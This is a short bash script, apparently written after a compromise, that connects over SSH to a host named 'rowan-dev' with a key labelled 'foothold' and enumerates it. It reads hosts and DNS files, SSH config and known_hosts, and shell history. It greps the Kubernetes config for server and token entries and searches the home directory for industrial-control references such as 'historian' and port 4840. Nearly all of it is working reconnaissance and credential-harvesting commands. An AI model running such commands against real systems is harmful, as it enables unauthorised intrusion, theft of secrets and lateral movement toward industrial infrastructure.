#!/bin/bash
set +e
SSH="ssh -i $HOME/.ssh/keplerops-foothold -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 rowan-dev"
$SSH 'set +e
echo "== hosts"; cat /etc/hosts
echo "== resolv"; cat /etc/resolv.conf
echo "== ssh dir"; ls -la ~/.ssh; echo "--- config"; cat ~/.ssh/config 2>/dev/null; echo "--- known_hosts"; cat ~/.ssh/known_hosts 2>/dev/null | cut -c1-160
echo "== bash_history"; tail -100 ~/.bash_history 2>/dev/null
echo "== kube cfg"; ls -la ~/.kube; grep -E "server|namespace|token" ~/.kube/config | head -20
echo "== find arwc/cairn refs in home"; grep -rIl -E "arwc|cairn|fuxa|historian|4840" ~ 2>/dev/null | grep -v -E "\.mozilla|\.cache|\.npm|node_modules" | head -30
echo "== route"; cat /proc/net/route
echo "== ip"; hostname -I' 2>&1 | tail -100
